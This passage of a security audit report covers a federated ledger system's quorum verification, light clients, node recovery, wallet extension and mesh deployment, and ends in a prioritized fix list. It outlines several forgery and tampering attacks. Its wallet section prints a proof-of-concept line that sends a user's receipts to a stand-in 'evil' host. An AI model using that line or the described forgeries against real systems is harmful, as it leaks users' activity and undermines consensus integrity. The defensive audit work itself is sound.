`duplicate_voter_qc_is_rejected` (the `[(0,sig0),(0,sig0),(0,sig0)]` forgery is
now rejected), `padded_duplicate_does_not_reach_threshold`, and
`genuine_distinct_voter_qc_is_accepted` (an N-distinct-voter QC still verifies).
Original report below.

`QuorumCertificate::is_valid_with_keys`/`verify_with_keys`
(`federation/src/types.rs:209-224,270-286`, lead-verified) check
`votes.len() >= threshold` and verify each `(voter_id, sig)` but **never dedup
`voter_id`**. The signed message is identical for every vote on a block, so
`votes = [(0,sig0),(0,sig0),(0,sig0)]` with `threshold=3` returns `true` — **one**
committee key forges a full quorum cert / checkpoint / light-client proof / epoch
transition, defeating BFT. `node.rs::collect_vote` dedups when *building* a QC, so
honest QCs are clean — only *verification* accepts forgeries. This is precisely the
Rust↔Lean weaponization: `bls_quorum_diff`'s `quorum_has_honest_signer`/
`no_equivocating_qcs` *assume* the verifier rejects duplicate signers, and the diff
is `#[cfg(test)]` so it never exercises this legacy Ed25519 verifier. (The BLS
`verify_with_committee` aggregate path is sound.) **Fix:** require distinct
`voter_id`s; count distinct voters against threshold. The single most urgent,
dependency-free fix in this pass.

### LC-1 (HIGH, live) — wired web-surface content gate is count-only, no crypto
`starbridge-web-surface/src/web_of_cells.rs:131-151` ("run before a byte reaches
the renderer", called from `rehydrate.rs:592`, transclusion, game, world) gates only
on `attested_root.has_quorum()`, which (`types/src/lib.rs:463-469`) is **count-only**
— `quorum_signatures.len() >= threshold` (no sig verified, no signer checked) or a
`ThresholdQC` of `len >= 48`. The crate holds no committee anchor and never calls
`is_valid(known_keys)`. A malicious content server fabricates an `AttestedResource`
(self-consistent) + an `AttestedRoot` with `threshold:0` (confirmed
`threshold_zero_root_has_quorum`) → renderer paints attacker bytes as attested. The
node-side gossip *does* anchor (`federation/src/node.rs:1325`,
`federation.rs:295` call `is_valid(&members)`); the gap is the light/web consumer.
**Fix:** the client must hold the committee keys and gate on `is_valid(known_keys)`;
`has_quorum` must never be an acceptance gate.

### LC-2 (HIGH, CRIT-by-design; demo/test reachable today) — no trusted validator set
`verify_finalized_history` (`lightclient/src/lib.rs:469-512`) accepts leg-3 when
`cert.has_quorum()` = `distinct_signers() >= supermajority_threshold(participant_count)`
— validator keys are **whatever the cert carries** and `participant_count` is
**attacker-supplied**; no committee param, no genesis/epoch anchoring. An
equivocating prover honestly executes a fork (same window shape ⇒ same VK
fingerprint, so the aggregate genuinely verifies), mints 3 fresh keypairs, signs
`finality_signing_message(fork_root, 4)`, sets `participant_count=4` → the client
accepts the fork as finalized. The Lean `CertValid`
(`FinalizedLightClient.lean:104`) is far stronger (anchored round-robin leader +
`isSuperRatified`). Only called from demos/tests today, so not a live exploit yet,
but it is the published "FINALIZED LIGHT-CLIENT CHECK" and its leg-3 is unsound.
**Fix:** pass the trusted committee; count only signers in that set.

### NODE-1 / NODE-2 (HIGH, live) — corrupt store on recovery
- **NODE-1:** `verify_recovery_convergence` (`node/src/state.rs:1096-1139`) reduces
  to `canonical_ledger_root(ledger) == store.recovered_ledger_root()` — fail-closed
  on mismatch, but the "expected" root is a plain unsigned `[u8;32]`
  (`persist/src/commit_log.rs:461-467,108`) stored in the *same tamperable redb*,
  and `canonical_ledger_root` is an **unkeyed** BLAKE3 with a public domain-sep. With
  offline write access: edit a cell + mirrored index, recompute the public root,
  overwrite `CommitRecord.ledger_root` → the gate passes, tampered ledger served as
  authoritative. It is crash-consistency wearing an integrity label.
- **NODE-2:** no anti-rollback / height monotonicity on boot (`recover_to_last_consistent`
  is wired only into `starbridge-v2`, not the node) → swap an older internally-
  consistent snapshot ⇒ revert finalized spends/burns, resurrect consumed nullifiers.
**Fix:** anchor "expected" to the federation-signed attested root (verify a quorum
sig over `(height, ledger_root)` with the committee keys already loaded); persist a
signed monotonic high-water mark and refuse a store below it.

### Lesser consensus findings
- **LC-3 (MED-HIGH, live):** the production-wired wasm light client
  (`wasm/src/bindings_lightclient.rs:155-200`) checks legs 1+2 only — **no finality
  gate** → returns `attested:true` for a finalized chain *and* an equivocating
  prover's internally-valid fork. Wire `verify_finalized_history` (after LC-2's fix).
- **F2 (HIGH, crate boundary):** admission bonds are self-asserted
  (`sign(domain‖owner‖amount)`, no escrow, `admission.rs:114-141,232-250`) →
  `Bond::post(sk, u64::MAX)` admits a free Sybil; slashing only `retain`s the
  struct. Bind `amount` to a verified locked-cell commitment.
- **LC-4 (MED):** the cert↔aggregate finality seam compares only lane-0
  (`final_root[0]`, ~31-bit, `lightclient/src/lib.rs:485,281`) — a genuine cert for
  root R can pair with a genuine aggregate of a different history colliding on
  lane-0 (~2^15.5, the codebase's own 31-bit scar). Sign/compare the full 8-felt
  anchor.
- **LC-5 (MED):** `AttestedRoot::is_valid` returns `true` for any `threshold_qc`
  with `len >= 48` regardless of `known_keys` (`types/src/lib.rs:499-504`).
- **F3/F4/F5 (MED, constructors):** threshold-decrypt is trusted-dealer with the
  published key == the raw symmetric key + non-constant-time MAC
  (`threshold_decrypt.rs:43-44,293`); no QC-vote-equivocation slashing atom (only
  block-equivocation, `court.rs`); `FederationCommittee::new`/`BeaconCommittee::deal`
  use transient toxic waste (prefer `new_with_eth_setup`/`dkg.rs`).

### HOLDS (verified)
The aggregate IVC core: VK pinned from config not the artifact (`VkFingerprintMismatch`),
spliced public root refused (`ClaimedPublicsUnattested`), forged/dropped/reordered
turns refused by leaf+temporal teeth (`lib.rs:1101-1208`) — matches the Lean
hypotheses; standing floor is FRI/STARK soundness (a standard crypto carrier).
BLS rogue-key has no on-wire registration; the hinTS hint binds pk↔sk (PoP-equiv);
DKG is real joint-Feldman (shares checked, QUAL disqualifies, aborts `|QUAL|<t`);
VRF is faithful RFC 9381. Recovery *order* is sound
(`reseed_genesis_then_overlay`, genesis baseline then overlay LWW — closes the old
double-credit bug); it is only as strong as NODE-1's anchor. `FinalityCert`
*does* dedup signers (`lib.rs:342`) — the complementary surface to F1's hole.

## 8. Wallet (extension / cipherclerk) — mostly HOLDS

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Key / seed exfil | **HOLDS** | — |
| 2 | Blind-sign / confirmation bypass | **HOLDS** (1 LOW residual) | LOW |
| 3 | Origin / message auth | MOSTLY HOLDS — one leak | **MEDIUM** |
| 4 | Data-loss footgun ("now fixed") | MOSTLY FIXED — recovery overwrite isn't | LOW-MED |

The two CRITICAL classes hold. **Keys never leave the background** (`window.dregg`
exposes no key read, `page.ts:413-417`; secret reads require `isExtensionPopup`,
`background.ts:3108-3124`; no `externally_connectable`/`onMessageExternal`; the
content bridge stamps the true `_origin` after the page detail so it can't be
spoofed, `content.ts:119-122`). **Encryption is real** (PBKDF2-SHA256 600k →
AES-256-GCM; wiped on lock; no secret logged). **Every signature is gated** by a
turn-hash-bound confirmation rendered from the same wasm `sign_turn_v3` output
(`background.ts:2755-2798`), unknown effects flagged (`explain.ts`), separate
focused OS window + `frame-ancestors 'none'` (clickjack-blocked), no auto-sign.

### WALLET-3 (MEDIUM) — cross-origin activity-stream leak
`dregg:subscribe` is in `UNRESTRICTED_METHODS` (`content.ts:12-21`), so any website
can `window.dregg.on('receipt'|'activity'|'intent', cb)`; `notifySubscribers`
(`background.ts:547-555`) broadcasts the user's own receipts/activity/intents to
**every** subscribed tab with **no origin check**. (`dregg:getActivityFeed` is
*not* page-allowlisted, yet the same object ships via `.on('activity')` —
inconsistent gating, contradicts PRIVACY.md.) PoC: any page
`window.dregg.on('receipt', r => fetch('https://evil/x?d='+btoa(JSON.stringify(r))))`.
**Fix:** move `dregg:subscribe` behind per-origin approval; don't deliver
`receipt`/`activity` to unapproved origins.

### WALLET-4 (LOW-MED) — recovery overwrite has no guard
`recoverFromMnemonic` (`background.ts:1350-1396`) has **no** `walletExists()` check
(unlike onboarding, which now guards correctly) — it unconditionally overwrites
`MNEMONIC_KEY` + the encrypted envelope, with no UI warning (`recovery.js:112-174`);
running Recover over a still-funded wallet silently loses the prior on-device key.
**Fix:** add the `walletExists()` gate + replace-confirmation, symmetric with
onboarding. (Onboarding data-loss is genuinely fixed: `beginOnboarding`/`complete`
refuse when `walletExists()`; no `storage.clear()`/factory-reset path exists.)
**LOW:** disclosure "remember" is keyed by origin only, not action/resource.

## 6. Mesh — HIGH MESH-2, MED MESH-1

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Join tailnet via forged/replayed preauth key | PARTIAL / EXPLOITABLE-ON-LEAK | MEDIUM |
| 2 | Reach node `:8420`/`:9420` you shouldn't | **EXPLOITABLE** | HIGH |
| 3 | ACL gaps (flat any→any) | MOSTLY HOLDS (role-tagged) | MEDIUM |

### MESH-2 (HIGH) — node ports on 0.0.0.0 with unauthenticated reads
`deploy/staging/docker-compose.yml:243-248` runs the node `--bind 0.0.0.0` and
host-publishes `8420:8420` + `9420:9420` (docker `ports:` inserts DOCKER iptables
rules that **bypass a host ufw**). Every *other* service was scoped — headscale's
control port is `127.0.0.1:8080:8080`, gateway/ops/bot are `expose:`-only — so the
node is the slip; it doesn't need host publication (the edge reaches it at
`127.0.0.1:8420`). The read API is **unauthenticated** — the bearer is attached
only on POST (`control/src/node_api.rs:286-288`); `/api/cells`, `/api/cell/{id}`,
`/api/receipts/index/*`, `/checkpoint/latest` are plain GETs. Anyone reaching
`:8420` (VPC peer, co-located container, or the internet if the SG allows / docker
punches through) dumps every cell+balance, nonce, the full receipt log + MMR root;
`:9420` gossip is likewise exposed. (Submit is bearer-gated, so this is read +
gossip exposure, not direct turn forgery — but a defense-in-depth collapse one SG
rule from full exposure.) **Fix:** scope to `127.0.0.1:8420:8420` / the overlay (or
drop `ports:` for `expose:`); require the bearer (or tailnet identity) on reads;
explicit SG deny on `8420/9420`.

### MESH-1 (MED) — reusable, long-lived preauth keys
Keys are minted **reusable, 30-day, tagged**
(`deploy/ARCHITECTURE-COMPUTE-BACKEND.md:149-153`,
`headscale preauthkeys create --reusable --expiration 720h`). A reusable key is a
bearer credential: one leak (the docs themselves say "ask ember / generate fresh")
lets an attacker `tailscale up --authkey=K` arbitrary nodes **repeatedly** for 30
days, each inheriting the key's tag. **Fix:** ephemeral + single-use keys
(`--ephemeral`, drop `--reusable`), short expiry, one per node, expire after join;
prefer interactive `headscale nodes register` for standing members. (No key
material is committed — verified; placeholders only.)

### HOLDS / lesser
The tailnet ACL is **not** flat — it is role-tagged least-privilege
(`deploy/staging/headscale/acls.hujson`: admin→`*:*`, `tag:edge`→`tag:compute`
limited ports, `tag:compute`→`tag:edge` limited, `tagOwners` restricts assignment),
headscale has `verify_clients:true`. **MESH-3 (MED, latent):**
`tag:compute → tag:edge:5432` + default `dreggnet/dreggnet` Postgres creds
(`.env.example:5-7`) — pg is compose-internal today, so latent. **MESH-0 (INFO):**
the vendored `net/httpe/.../tailscale_auth.rs` whois middleware is **not wired into
any DreggNet service** — nothing authenticates by tailnet identity; everything
rides bearer + ACL + port scoping (which MESH-2 undercuts).

## Prioritized fix list

1. **CAP-1 (CRITICAL)** — ✅ FIXED: `determine_required_permissions` is now an
   exhaustive (closed, no `_ =>`) match mapping `SetProgram`/`MakeSovereign` → the
   `SetVerificationKey` floor and `CellSeal`/`CellUnseal`/`CellDestroy` → the
   `SetPermissions` floor, so `Authorization::Unchecked` can no longer overwrite or
   destroy a victim cell. Lean-aligned (`Dregg2.Exec.EffectsAuthority`/`EffectsState`);
   regression-pinned by `cap1_authority_tests`. (Defense-in-depth follow-up: also
   enforce the held cap's level + `allowed_effects` facet on the direct cross-cell
   path the way `ExerciseViaCapability` does — separate from the closed Unchecked hole.)
2. **SBX-1/2/3 (CRITICAL, live)** — wasmtime provider default empty (not root);
   override `instantiate_with_caps`; make `fs_preopen_from_cap` fail-closed; refuse
   `native-provider` on non-Linux. Do before ANY untrusted-guest deployment.
3. **GW-4a (CRITICAL→HIGH)** — ✅ FIXED: `/api/op` now requires a per-user
   ownership-proof token (or the operator token); an unproven `user_id` is `401`.
   Residual (gateway lane): scope the Caddy `/api/*` matcher so `/api/op` is not
   proxied publicly. *Needs redeploy (bot is live on the edge).*
4. **LEASE-1a + LEASE-3 (CRITICAL, live)** — read the verified on-chain lease before
   minting a funded lease; persist + kernel-enforce the `(lease,period)` settlement
   dedup.
5. **F1 (✅ FIXED)** — `voter_id` deduped in the Ed25519 QC verifier
   (`is_valid_with_keys`/`verify_with_keys` reject duplicate voters; only distinct
   voters count toward threshold). Single-key quorum forgery defeated.
6. **LC-1 / LC-2 / LC-3 (HIGH)** — anchor every light/web acceptance to the signed
   committee attestation: gate on `is_valid(known_keys)`, pass the trusted
   validator set to `verify_finalized_history`, and wire a finality gate into the
   production light client.
7. **NODE-1 / NODE-2 (HIGH, live)** — anchor recovery to the federation-signed root +
   a signed monotonic high-water mark.
8. **GW-1 / GW-2 (HIGH, live)** — app-layer auth on the gateway machines API;
   close the `*.dregg.works`/`www` fall-through; set `OPS_ADMIN_TOKEN`.
9. **MESH-2 (HIGH, live)** — scope node `:8420/:9420` off `0.0.0.0`; auth the reads.
10. **BR-2 / BR-3 / BR-1 (CRITICAL, latent)** — before any relayer/webhook deploy:
    bind inclusion to a bridge-owned escrow, gate mints on the authorized-voter
    tally, pin the anchor, make conservation non-vacuous from an independent locked
    source, and demote the RAM mint APIs.
11. **F2 (HIGH)** — back admission bonds with a verified locked-cell commitment.
12. **MED/LOW** — WALLET-3 (per-origin subscribe), MESH-1 (ephemeral preauth keys),

*Method note:* eight surfaces were attacked in parallel by adversarial reviewers
reading both repos; the lead re-verified the CAP-1 (catch-all + Access/Unchecked +
SetProgram self-target), F1 (no voter dedup), and supporting cites against source
at HEAD before stamping. No code was patched in this pass — each finding is a
separate fix lane. Latent vs live is tagged per finding; "HOLDS" findings carry
their blocking evidence so they are not re-litigated.
